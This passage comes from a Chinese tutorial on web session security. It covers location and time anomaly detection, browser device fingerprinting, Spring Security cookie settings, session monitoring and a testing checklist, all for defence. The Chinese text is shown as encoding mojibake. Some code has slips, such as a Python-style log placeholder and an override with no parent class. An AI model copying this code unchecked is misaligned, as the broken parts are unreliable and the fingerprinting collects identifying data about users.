            .allMatch(location -> calculateDistance(location, currentLocation) > 500); // 500å…¬é‡Œ
        
        if (isAnomalous) {
            // è®°å½•å¼‚å¸¸ç™»å½•
            securityEventService.recordAnomalousLogin(userId, currentLocation);
            
            // å‘é€å®‰å…¨æé†’
            notificationService.sendLocationAlert(userId, currentLocation);
        }
        
        // è®°å½•æœ¬æ¬¡ç™»å½•ä½ç½®
        saveLoginLocation(userId, currentLocation);
        
        return isAnomalous;
    }
    
    private double calculateDistance(LocationInfo loc1, LocationInfo loc2) {
        // ä½¿ç”¨Haversineå…¬å¼è®¡ç®—åœ°çƒè¡¨é¢ä¸¤ç‚¹é—´è·ç¦»
        double lat1Rad = Math.toRadians(loc1.getLatitude());
        double lat2Rad = Math.toRadians(loc2.getLatitude());
        double deltaLat = Math.toRadians(loc2.getLatitude() - loc1.getLatitude());
        double deltaLon = Math.toRadians(loc2.getLongitude() - loc1.getLongitude());
        
        double a = Math.sin(deltaLat/2) * Math.sin(deltaLat/2) +
                   Math.cos(lat1Rad) * Math.cos(lat2Rad) *
                   Math.sin(deltaLon/2) * Math.sin(deltaLon/2);
        double c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
        
        return 6371 * c; // åœ°çƒåŠå¾„çº¦ä¸º6371å…¬é‡Œ
    }
}
```

**â° æ—¶é—´å¼‚å¸¸æ£€æµ‹**
```java
@Service
public class TimeAnomalyDetector {
    
    public boolean detectTimeAnomaly(String userId) {
        // è·å–ç”¨æˆ·çš„å¸¸ç”¨ç™»å½•æ—¶é—´æ¨¡å¼
        List<LoginTime> userLoginPattern = getUserLoginPattern(userId);
        
        if (userLoginPattern.isEmpty()) {
            return false; // æ–°ç”¨æˆ·ï¼Œæ— æ³•åˆ¤æ–­
        }
        
        LocalTime currentTime = LocalTime.now();
        int currentHour = currentTime.getHour();
        
        // åˆ†æç”¨æˆ·çš„æ´»è·ƒæ—¶é—´æ®µ
        Map<Integer, Long> hourlyActivityCount = userLoginPattern.stream()
            .collect(Collectors.groupingBy(
                login -> login.getLoginTime().getHour(),
                Collectors.counting()
            ));
        
        // è®¡ç®—å½“å‰æ—¶é—´æ®µçš„æ´»è·ƒåº¦
        long currentHourActivity = hourlyActivityCount.getOrDefault(currentHour, 0L);
        long totalActivity = hourlyActivityCount.values().stream()
            .mapToLong(Long::longValue).sum();
        
        // å¦‚æœå½“å‰æ—¶é—´æ®µçš„æ´»è·ƒåº¦ä½äº5%ï¼Œè®¤ä¸ºæ˜¯å¼‚å¸¸æ—¶é—´
        double activityRate = (double) currentHourActivity / totalActivity;
        
        boolean isAnomalous = activityRate < 0.05 && totalActivity > 10; // è‡³å°‘æœ‰10æ¬¡ç™»å½•è®°å½•
        
        if (isAnomalous) {
            logger.info("æ£€æµ‹åˆ°ç”¨æˆ·{}åœ¨å¼‚å¸¸æ—¶é—´ç™»å½•: {}å°æ—¶, æ´»è·ƒåº¦: {:.2%}", 
                       userId, currentHour, activityRate);
        }
        
        return isAnomalous;
    }
}
```

### 8.4 è®¾å¤‡æŒ‡çº¹è¯†åˆ«


**ğŸ” é«˜çº§è®¾å¤‡æŒ‡çº¹æŠ€æœ¯**
```javascript
// å‰ç«¯æ”¶é›†è®¾å¤‡æŒ‡çº¹ä¿¡æ¯
function collectDeviceFingerprint() {
    const fingerprint = {
        // å±å¹•ä¿¡æ¯
        screen: {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth
        },
        
        // æµè§ˆå™¨ä¿¡æ¯
        navigator: {
            userAgent: navigator.userAgent,
            language: navigator.language,
            languages: navigator.languages,
            platform: navigator.platform,
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack
        },
        
        // æ—¶é—´ä¿¡æ¯
        timezone: {
            offset: new Date().getTimezoneOffset(),
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        },
        
        // CanvasæŒ‡çº¹
        canvas: generateCanvasFingerprint(),
        
        // WebGLæŒ‡çº¹
        webgl: generateWebGLFingerprint(),
        
        // å­—ä½“æ£€æµ‹
        fonts: detectAvailableFonts()
    };
    
    return btoa(JSON.stringify(fingerprint));
}

function generateCanvasFingerprint() {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    
    // ç»˜åˆ¶ç‰¹å®šå›¾æ¡ˆ
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillText('Device fingerprinting', 2, 2);
    
    // è¿”å›å›¾åƒæ•°æ®çš„å“ˆå¸Œ
    return canvas.toDataURL();
}
```

**ğŸ”’ æœåŠ¡ç«¯è®¾å¤‡éªŒè¯**
```java
@Service
public class DeviceVerificationService {
    
    public boolean verifyDeviceFingerprint(String userId, String currentFingerprint, 
                                          HttpSession session) {
        // è·å–ç”¨æˆ·çš„å·²çŸ¥è®¾å¤‡åˆ—è¡¨
        List<TrustedDevice> trustedDevices = getTrustedDevices(userId);
        
        // æ£€æŸ¥å½“å‰æŒ‡çº¹æ˜¯å¦åŒ¹é…å·²çŸ¥è®¾å¤‡
        boolean isKnownDevice = trustedDevices.stream()
            .anyMatch(device -> device.getFingerprint().equals(currentFingerprint));
        
        if (!isKnownDevice) {
            // æ–°è®¾å¤‡ï¼Œéœ€è¦é¢å¤–éªŒè¯
            logger.info("æ£€æµ‹åˆ°ç”¨æˆ·{}ä½¿ç”¨æ–°è®¾å¤‡ç™»å½•", userId);
            
            // æ ‡è®°Sessionéœ€è¦é¢å¤–éªŒè¯
            session.setAttribute("requiresDeviceVerification", true);
            session.setAttribute("deviceFingerprint", currentFingerprint);
            
            // å‘é€è®¾å¤‡éªŒè¯é€šçŸ¥
            sendDeviceVerificationNotification(userId);
            
            return false;
        }
        
        // æ›´æ–°è®¾å¤‡æœ€åä½¿ç”¨æ—¶é—´
        updateDeviceLastUsed(userId, currentFingerprint);
        
        return true;
    }
    
    // ç”¨æˆ·ç¡®è®¤æ–°è®¾å¤‡åï¼Œæ·»åŠ åˆ°ä¿¡ä»»åˆ—è¡¨
    public void trustNewDevice(String userId, String fingerprint, String deviceName) {
        TrustedDevice device = new TrustedDevice();
        device.setUserId(userId);
        device.setFingerprint(fingerprint);
        device.setDeviceName(deviceName);
        device.setTrustedTime(LocalDateTime.now());
        device.setLastUsedTime(LocalDateTime.now());
        
        trustedDeviceRepository.save(device);
        
        logger.info("ç”¨æˆ·{}æ·»åŠ æ–°çš„å¯ä¿¡è®¾å¤‡: {}", userId, deviceName);
    }
}
```

---

## 9. ğŸ“‹ æ ¸å¿ƒè¦ç‚¹æ€»ç»“


### 9.1 å¿…é¡»æŒæ¡çš„æ ¸å¿ƒæ¦‚å¿µ


```
ğŸ”¸ Sessionæœ¬è´¨ï¼šæœåŠ¡å™¨ä¸ºç”¨æˆ·åˆ†é…çš„ä¸´æ—¶èº«ä»½æ ‡è¯†
ğŸ”¸ Sessionç”Ÿå‘½å‘¨æœŸï¼šåˆ›å»ºâ†’ä½¿ç”¨â†’è¿‡æœŸâ†’é”€æ¯çš„å®Œæ•´æµç¨‹
ğŸ”¸ å­˜å‚¨æ–¹å¼é€‰æ‹©ï¼šå†…å­˜ã€Redisã€æ•°æ®åº“å„æœ‰ä¼˜åŠ£
ğŸ”¸ å®‰å…¨é…ç½®ï¼šéšæœºIDã€å®‰å…¨è¿‡æœŸã€HTTPSä¼ è¾“
ğŸ”¸ æ”»å‡»é˜²æŠ¤ï¼šä¼šè¯å›ºå®šã€ä¼šè¯åŠ«æŒã€XSSçªƒå–é˜²æŠ¤
ğŸ”¸ Cookieå®‰å…¨ï¼šHttpOnlyã€Secureã€SameSiteä¸‰é‡ä¿æŠ¤
ğŸ”¸ å¤šç«¯ç®¡ç†ï¼šè®¾å¤‡é™åˆ¶ã€å¼‚åœ°æ£€æµ‹ã€ä¸»åŠ¨è¸¢å‡ºæœºåˆ¶
```

### 9.2 å…³é”®ç†è§£è¦ç‚¹


**ğŸ”¹ Sessionå®‰å…¨çš„æ ¸å¿ƒåŸåˆ™**
```
å”¯ä¸€æ€§åŸåˆ™ï¼š
â””â”€ Session IDå¿…é¡»å…¨å±€å”¯ä¸€ä¸”ä¸å¯é¢„æµ‹
â””â”€ ä½¿ç”¨åŠ å¯†å®‰å…¨çš„éšæœºæ•°ç”Ÿæˆå™¨

ä¿å¯†æ€§åŸåˆ™ï¼š
â””â”€ Session IDåªèƒ½é€šè¿‡å®‰å…¨æ¸ é“ä¼ è¾“ï¼ˆHTTPSï¼‰
â””â”€ ç¦æ­¢JavaScriptè®¿é—®Session Cookieï¼ˆHttpOnlyï¼‰

å®Œæ•´æ€§åŸåˆ™ï¼š
â””â”€ å®šæœŸæ›´æ¢Session IDï¼Œç‰¹åˆ«æ˜¯ç™»å½•å
â””â”€ æ£€æµ‹å¼‚å¸¸ä½¿ç”¨æ¨¡å¼ï¼ŒåŠæ—¶å“åº”

å¯æ§æ€§åŸåˆ™ï¼š
â””â”€ æ”¯æŒä¸»åŠ¨é”€æ¯Session
â””â”€ å®ç°å¤šè®¾å¤‡ç®¡ç†å’Œæ§åˆ¶
```

**ğŸ”¹ æ”»å‡»é˜²æŠ¤çš„å±‚æ¬¡åŒ–æ€ç»´**
```
ä¼ è¾“å±‚é˜²æŠ¤ï¼š
â””â”€ HTTPSåŠ å¯†ä¼ è¾“
â””â”€ å®‰å…¨Headersé…ç½®

åº”ç”¨å±‚é˜²æŠ¤ï¼š
â””â”€ Session IDé‡æ–°ç”Ÿæˆ
â””â”€ XSSè¿‡æ»¤å’Œè¾“å…¥éªŒè¯

ä¸šåŠ¡å±‚é˜²æŠ¤ï¼š
â””â”€ å¼‚å¸¸è¡Œä¸ºæ£€æµ‹
â””â”€ å¤šå› ç´ èº«ä»½éªŒè¯

ç›‘æ§å±‚é˜²æŠ¤ï¼š
â””â”€ å®æ—¶æ—¥å¿—åˆ†æ
â””â”€ å®‰å…¨äº‹ä»¶å“åº”
```

**ğŸ”¹ å¤šç«¯ç®¡ç†çš„å¹³è¡¡ç­–ç•¥**
```
å®‰å…¨æ€§ vs ä¾¿åˆ©æ€§ï¼š
â””â”€ è®¾å¤‡æ•°é‡é™åˆ¶è¦åˆç†
â””â”€ å¼‚åœ°ç™»å½•æ£€æµ‹è¦å‡†ç¡®
â””â”€ æä¾›ç”¨æˆ·è‡ªä¸»ç®¡ç†èƒ½åŠ›

æ€§èƒ½ vs åŠŸèƒ½ï¼š
â””â”€ è®¾å¤‡æŒ‡çº¹ä¸èƒ½å¤ªå¤æ‚
â””â”€ ä½ç½®æ£€æµ‹è¦å¿«é€Ÿå“åº”
â””â”€ æ•°æ®å­˜å‚¨è¦ä¼˜åŒ–
```

### 9.3 å®é™…åº”ç”¨å»ºè®®


**ğŸ¯ ä¸åŒåœºæ™¯çš„Sessionç­–ç•¥**
```
é‡‘èåº”ç”¨ï¼š
â””â”€ 30åˆ†é’Ÿå¼ºåˆ¶è¿‡æœŸ
â””â”€ ç™»å½•åå¿…é¡»æ›´æ¢Session ID
â””â”€ ä¸¥æ ¼çš„å¼‚åœ°ç™»å½•æ£€æµ‹
â””â”€ å•è®¾å¤‡ç™»å½•é™åˆ¶

ç”µå•†åº”ç”¨ï¼š
â””â”€ 2å°æ—¶æ»‘åŠ¨è¿‡æœŸ
â””â”€ è´­ç‰©è½¦æ•°æ®è¿ç§»ä¿æŠ¤
â””â”€ å¤šè®¾å¤‡åŒæ­¥è´­ç‰©è½¦
â””â”€ è®°ä½æˆ‘åŠŸèƒ½æ”¯æŒ

ç¤¾äº¤åº”ç”¨ï¼š
â””â”€ 7å¤©è®°ä½ç™»å½•
â””â”€ å¤šè®¾å¤‡æ¶ˆæ¯åŒæ­¥
â””â”€ å®æ—¶åœ¨çº¿çŠ¶æ€ç®¡ç†
â””â”€ éšç§æ¨¡å¼æ”¯æŒ

ä¼ä¸šå†…éƒ¨ç³»ç»Ÿï¼š
â””â”€ 8å°æ—¶å·¥ä½œæ—¶é—´æœ‰æ•ˆ
â””â”€ ä¸¥æ ¼çš„IPç™½åå•
â””â”€ è®¾å¤‡è¯ä¹¦ç»‘å®š
â””â”€ è¯¦ç»†çš„å®¡è®¡æ—¥å¿—
```

**ğŸ”§ Sessionå®‰å…¨é…ç½®æœ€ä½³å®è·µ**
```java
// æ¨èçš„ç”Ÿäº§ç¯å¢ƒSessionå®‰å…¨é…ç½®
@Configuration
@EnableWebSecurity
public class ProductionSessionConfig {
    
    @Bean
    public CookieSerializer productionCookieSerializer() {
        DefaultCookieSerializer serializer = new DefaultCookieSerializer();
        
        // åŸºç¡€å®‰å…¨é…ç½®
        serializer.setCookieName("APPSID");           // éšè—æŠ€æœ¯æ ˆ
        serializer.setUseHttpOnlyCookie(true);        // é˜²XSSæ”»å‡»
        serializer.setUseSecureCookie(true);          // å¼ºåˆ¶HTTPS
        serializer.setSameSite("Strict");             // é˜²CSRFæ”»å‡»
        
        // ä½œç”¨åŸŸé™åˆ¶
        serializer.setCookiePath("/");                // å…¨ç«™æœ‰æ•ˆ
        serializer.setDomainName("app.example.com");  // ç²¾ç¡®åŸŸå
        
        return serializer;
    }
    
    @Bean
    public SessionRegistry sessionRegistry() {
        return new SessionRegistryImpl();
    }
    
    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
            .sessionManagement()
                .sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED)
                .sessionFixation().migrateSession()    // ç™»å½•åè¿ç§»Session
                .maximumSessions(3)                     // æœ€å¤š3ä¸ªè®¾å¤‡
                .maxSessionsPreventsLogin(false)        // æ–°ç™»å½•è¸¢æ‰æ—§è®¾å¤‡
                .sessionRegistry(sessionRegistry())
                .and()
            .headers()
                .frameOptions().deny()                  // é˜²æ­¢frameåµŒå¥—
                .contentTypeOptions().noSniff()         // é˜²æ­¢MIMEå—…æ¢
                .httpStrictTransportSecurity(hstsConfig -> 
                    hstsConfig.maxAgeInSeconds(31536000) // HSTSä¸€å¹´
                             .includeSubdomains(true))
            .and()
            .csrf()
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse());
    }
}
```

**ğŸ›¡ï¸ ç›‘æ§å’Œå“åº”ç­–ç•¥**
```java
@Component
public class SessionSecurityMonitor {
    
    @Scheduled(fixedRate = 60000) // æ¯åˆ†é’Ÿæ£€æŸ¥ä¸€æ¬¡
    public void monitorSessionSecurity() {
        // 1. æ£€æŸ¥å¼‚å¸¸Sessionæ•°é‡
        long totalSessions = sessionRegistry.getAllPrincipals().size();
        if (totalSessions > maxConcurrentSessions) {
            logger.warn("Sessionæ•°é‡å¼‚å¸¸: {}, è¶…è¿‡é˜ˆå€¼: {}", 
                       totalSessions, maxConcurrentSessions);
            alertService.sendAlert("Sessionæ•°é‡å¼‚å¸¸");
        }
        
        // 2. æ£€æŸ¥é•¿æ—¶é—´æ— æ´»åŠ¨çš„Session
        sessionRegistry.getAllPrincipals().forEach(principal -> {
            List<SessionInformation> sessions = sessionRegistry.getAllSessions(principal, false);
            sessions.forEach(session -> {
                if (isSessionTooOld(session)) {
                    logger.info("å¼ºåˆ¶è¿‡æœŸé•¿æ—¶é—´æ— æ´»åŠ¨Session: {}", session.getSessionId());
                    session.expireNow();
                }
            });
        });
        
        // 3. æ£€æŸ¥å¯ç–‘çš„ç™»å½•æ¨¡å¼
        detectSuspiciousLoginPatterns();
    }
    
    private void detectSuspiciousLoginPatterns() {
        // æ£€æŸ¥çŸ­æ—¶é—´å†…å¤§é‡ç™»å½•è¯·æ±‚
        List<LoginAttempt> recentAttempts = getRecentLoginAttempts(Duration.ofMinutes(5));
        
        Map<String, Long> attemptsByIP = recentAttempts.stream()
            .collect(Collectors.groupingBy(LoginAttempt::getIpAddress, Collectors.counting()));
        
        attemptsByIP.forEach((ip, count) -> {
            if (count > 20) { // 5åˆ†é’Ÿå†…è¶…è¿‡20æ¬¡ç™»å½•
                logger.warn("æ£€æµ‹åˆ°å¯ç–‘IPç™»å½•é¢‘ç‡: IP={}, æ¬¡æ•°={}", ip, count);
                securityService.blockIP(ip, Duration.ofHours(1));
            }
        });
    }
}
```

**ğŸ“Š æ€§èƒ½ä¼˜åŒ–å»ºè®®**
```java
@Configuration
@EnableRedisHttpSession(
    maxInactiveIntervalInSeconds = 1800,  // 30åˆ†é’Ÿè¿‡æœŸ
    redisNamespace = "app:session"        // å‘½åç©ºé—´éš”ç¦»
)
public class PerformanceOptimizedSessionConfig {
    
    @Bean
    public RedisTemplate<String, Object> sessionRedisTemplate() {
        RedisTemplate<String, Object> template = new RedisTemplate<>();
        template.setConnectionFactory(jedisConnectionFactory());
        
        // ä½¿ç”¨é«˜æ•ˆçš„åºåˆ—åŒ–æ–¹å¼
        template.setDefaultSerializer(new GenericJackson2JsonRedisSerializer());
        template.setKeySerializer(new StringRedisSerializer());
        
        // å¼€å¯äº‹åŠ¡æ”¯æŒ
        template.setEnableTransactionSupport(true);
        
        return template;
    }
    
    @Bean
    public JedisConnectionFactory jedisConnectionFactory() {
        JedisPoolConfig poolConfig = new JedisPoolConfig();
        poolConfig.setMaxTotal(200);           // æœ€å¤§è¿æ¥æ•°
        poolConfig.setMaxIdle(50);             // æœ€å¤§ç©ºé—²è¿æ¥
        poolConfig.setMinIdle(10);             // æœ€å°ç©ºé—²è¿æ¥
        poolConfig.setTestOnBorrow(true);      // å€Ÿç”¨æ—¶æµ‹è¯•è¿æ¥
        poolConfig.setTestOnReturn(true);      // å½’è¿˜æ—¶æµ‹è¯•è¿æ¥
        
        JedisConnectionFactory factory = new JedisConnectionFactory();
        factory.setPoolConfig(poolConfig);
        factory.setHostName("redis-cluster.internal.com");
        factory.setPort(6379);
        factory.setDatabase(2);                // ä½¿ç”¨ä¸“ç”¨æ•°æ®åº“
        factory.setTimeout(3000);              // 3ç§’è¶…æ—¶
        
        return factory;
    }
}
```

### 9.4 å¸¸è§é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ


**â“ å¸¸è§Sessioné—®é¢˜æ’æŸ¥**
```
é—®é¢˜1ï¼šç”¨æˆ·é¢‘ç¹æ‰çº¿
å¯èƒ½åŸå› ï¼š
â””â”€ Sessionè¿‡æœŸæ—¶é—´è®¾ç½®è¿‡çŸ­
â””â”€ è´Ÿè½½å‡è¡¡å™¨æ²¡æœ‰é…ç½®Sessionç²˜æ»
â””â”€ Redisè¿æ¥ä¸ç¨³å®š

è§£å†³æ–¹æ¡ˆï¼š
â””â”€ è°ƒæ•´è¿‡æœŸæ—¶é—´ä¸ºåˆç†å€¼
â””â”€ é…ç½®è´Ÿè½½å‡è¡¡çš„Sessionäº²å’Œæ€§
â””â”€ ä¼˜åŒ–Redisè¿æ¥æ± é…ç½®

é—®é¢˜2ï¼šSessionå ç”¨å†…å­˜è¿‡å¤§
å¯èƒ½åŸå› ï¼š
â””â”€ Sessionä¸­å­˜å‚¨äº†å¤§é‡æ•°æ®
â””â”€ Sessionæ²¡æœ‰åŠæ—¶æ¸…ç†
â””â”€ ç”¨æˆ·æ•°é‡è¶…å‡ºé¢„æœŸ

è§£å†³æ–¹æ¡ˆï¼š
â””â”€ åªåœ¨Sessionä¸­å­˜å‚¨å¿…è¦ä¿¡æ¯
â””â”€ å®ç°å®šæœŸæ¸…ç†æœºåˆ¶
â””â”€ è€ƒè™‘ä½¿ç”¨Redisç­‰å¤–éƒ¨å­˜å‚¨

é—®é¢˜3ï¼šè·¨åŸŸSessionå…±äº«é—®é¢˜
å¯èƒ½åŸå› ï¼š
â””â”€ CookieåŸŸåé…ç½®ä¸æ­£ç¡®
â””â”€ SameSiteè®¾ç½®è¿‡äºä¸¥æ ¼
â””â”€ CORSé…ç½®æœ‰é—®é¢˜

è§£å†³æ–¹æ¡ˆï¼š
â””â”€ æ­£ç¡®é…ç½®CookieåŸŸå
â””â”€ è°ƒæ•´SameSiteä¸ºLaxæˆ–None
â””â”€ é…ç½®æ­£ç¡®çš„CORSç­–ç•¥
```

**ğŸ”§ æ•…éšœæ¢å¤å’Œå®¹ç¾æ–¹æ¡ˆ**
```java
@Service
public class SessionDisasterRecoveryService {
    
    // Sessionæ•°æ®å¤‡ä»½
    @Scheduled(cron = "0 0 */4 * * *") // æ¯4å°æ—¶å¤‡ä»½ä¸€æ¬¡
    public void backupSessionData() {
        try {
            Set<String> allSessionIds = redisTemplate.keys("spring:session:sessions:*");
            
            Map<String, Object> sessionBackup = new HashMap<>();
            allSessionIds.forEach(sessionId -> {
                Map<Object, Object> sessionData = redisTemplate.opsForHash().entries(sessionId);
                sessionBackup.put(sessionId, sessionData);
            });
            
            // å¤‡ä»½åˆ°æ–‡ä»¶æˆ–å¤‡ç”¨Rediså®ä¾‹
            backupStorage.save("session_backup_" + LocalDateTime.now(), sessionBackup);
            
            logger.info("Sessionæ•°æ®å¤‡ä»½å®Œæˆï¼Œå¤‡ä»½äº†{}ä¸ªSession", allSessionIds.size());
        } catch (Exception e) {
            logger.error("Sessionå¤‡ä»½å¤±è´¥", e);
        }
    }
    
    // æ•…éšœæ¢å¤
    public void recoverSessionData(String backupKey) {
        try {
            Map<String, Object> backupData = backupStorage.load(backupKey);
            
            backupData.forEach((sessionId, sessionData) -> {
                redisTemplate.opsForHash().putAll(sessionId, (Map<?, ?>) sessionData);
                // è®¾ç½®é€‚å½“çš„è¿‡æœŸæ—¶é—´
                redisTemplate.expire(sessionId, Duration.ofMinutes(30));
            });
            
            logger.info("Sessionæ•°æ®æ¢å¤å®Œæˆï¼Œæ¢å¤äº†{}ä¸ªSession", backupData.size());
        } catch (Exception e) {
            logger.error("Sessionæ¢å¤å¤±è´¥", e);
        }
    }
}
```

### 9.5 å®‰å…¨è¯„ä¼°å’Œæµ‹è¯•


**ğŸ§ª Sessionå®‰å…¨æµ‹è¯•æ¸…å•**
```
Session IDå®‰å…¨æ€§æµ‹è¯•ï¼š
â–¡ Session IDé•¿åº¦æ˜¯å¦è¶³å¤Ÿï¼ˆ>=128ä½ï¼‰
â–¡ Session IDæ˜¯å¦åŒ…å«ç”¨æˆ·ä¿¡æ¯
â–¡ Session IDæ˜¯å¦å¯é¢„æµ‹
â–¡ Session IDæ˜¯å¦åœ¨URLä¸­æš´éœ²

Sessionä¼ è¾“å®‰å…¨æ€§æµ‹è¯•ï¼š
â–¡ æ˜¯å¦å¼ºåˆ¶ä½¿ç”¨HTTPS
â–¡ Cookieæ˜¯å¦è®¾ç½®äº†HttpOnly
â–¡ Cookieæ˜¯å¦è®¾ç½®äº†Secure
â–¡ Cookieæ˜¯å¦è®¾ç½®äº†SameSite

Sessionç®¡ç†å®‰å…¨æ€§æµ‹è¯•ï¼š
â–¡ ç™»å½•åæ˜¯å¦æ›´æ¢Session ID
â–¡ é€€å‡ºåæ˜¯å¦å½»åº•é”€æ¯Session
â–¡ Sessionè¶…æ—¶æ˜¯å¦æ­£å¸¸å·¥ä½œ
â–¡ å¼‚å¸¸æƒ…å†µä¸‹Sessionæ˜¯å¦æ­£ç¡®å¤„ç†

æ”»å‡»é˜²æŠ¤æµ‹è¯•ï¼š
â–¡ ä¼šè¯å›ºå®šæ”»å‡»é˜²æŠ¤æ˜¯å¦æœ‰æ•ˆ
â–¡ ä¼šè¯åŠ«æŒæ£€æµ‹æ˜¯å¦å·¥ä½œ
â–¡ XSSæ”»å‡»æ˜¯å¦èƒ½çªƒå–Session
â–¡ CSRFæ”»å‡»æ˜¯å¦è¢«æ­£ç¡®é˜»æ­¢

å¤šç«¯ç®¡ç†æµ‹è¯•ï¼š
â–¡ è®¾å¤‡é™åˆ¶æ˜¯å¦ç”Ÿæ•ˆ
â–¡ è®¾å¤‡è¸¢å‡ºåŠŸèƒ½æ˜¯å¦æ­£å¸¸
â–¡ å¼‚åœ°ç™»å½•æ£€æµ‹æ˜¯å¦å‡†ç¡®
â–¡ è®¾å¤‡æŒ‡çº¹è¯†åˆ«æ˜¯å¦å¯é 
```

**ğŸ” å®‰å…¨è¯„ä¼°å·¥å…·å’Œæ–¹æ³•**
```bash
# ä½¿ç”¨OWASP ZAPè¿›è¡ŒSessionå®‰å…¨æµ‹è¯•
java -jar zap-2.11.1.jar -cmd -quickurl http://localhost:8080 \
     -quickprogress -quickout /tmp/zap-report.html

# ä½¿ç”¨Burp Suiteè¿›è¡ŒSessionåˆ†æ
# 1. é…ç½®ä»£ç†ï¼Œæ‹¦æˆªæ‰€æœ‰è¯·æ±‚
# 2. åˆ†æSession IDçš„éšæœºæ€§
# 3. æµ‹è¯•Sessionå›ºå®šæ”»å‡»
# 4. éªŒè¯Sessionè¶…æ—¶æœºåˆ¶

# ä½¿ç”¨è‡ªå®šä¹‰è„šæœ¬æ£€æŸ¥Sessioné…ç½®
curl -I http://localhost:8080/login | grep -i "set-cookie"
# æ£€æŸ¥è¾“å‡ºä¸­æ˜¯å¦åŒ…å«ï¼šHttpOnly; Secure; SameSite=Strict
```

**æ ¸å¿ƒè®°å¿†è¦ç‚¹**ï¼š
- Sessionæ˜¯ç”¨æˆ·èº«ä»½çš„ä¸´æ—¶æ ‡è¯†ï¼Œå®‰å…¨æ€§ç›´æ¥å½±å“æ•´ä¸ªåº”ç”¨
- æ”»å‡»é˜²æŠ¤è¦ä»ä¼ è¾“ã€å­˜å‚¨ã€ä½¿ç”¨ä¸‰ä¸ªå±‚é¢è€ƒè™‘
- å¤šç«¯ç®¡ç†æ—¢è¦ä¿è¯å®‰å…¨æ€§ï¼Œä¹Ÿè¦å…¼é¡¾ç”¨æˆ·ä½“éªŒ
- ç›‘æ§å’Œå“åº”æœºåˆ¶æ˜¯Sessionå®‰å…¨çš„é‡è¦ä¿éšœ
- å®šæœŸæµ‹è¯•å’Œè¯„ä¼°æ˜¯æŒç»­æ”¹è¿›å®‰å…¨æ€§çš„å…³é”®